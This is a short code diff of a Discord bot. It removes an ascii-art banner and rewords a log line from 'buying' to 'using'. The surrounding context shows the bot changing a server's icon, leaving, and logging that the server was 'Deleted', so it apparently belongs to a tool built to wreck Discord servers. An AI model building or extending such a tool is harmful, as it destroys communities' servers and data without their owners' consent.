@@ -1,9 +1,7 @@
 const Discord = require('discord.js');
 const client = new Discord.Client();
 const config = require('./config.json');
-const ascii = require('ascii-art');
 const packageVersion = require("./package.json").version;
-ascii.font('Conflicted', 'Doom', function(art) {console.log(art)});
 
 //Made By Conflicted.
 
@@ -58,7 +56,7 @@ guild.setIcon(config.NEW_SERVER_ICON_URL); //Set the server icon
 
 guild.leave(); //Leave the server
 
-console.log(`Deleted ${guild.name}!, Thanks for buying this bot!`);
+console.log(`Deleted ${guild.name}!, Thanks for using this bot!`);
 
 });
 
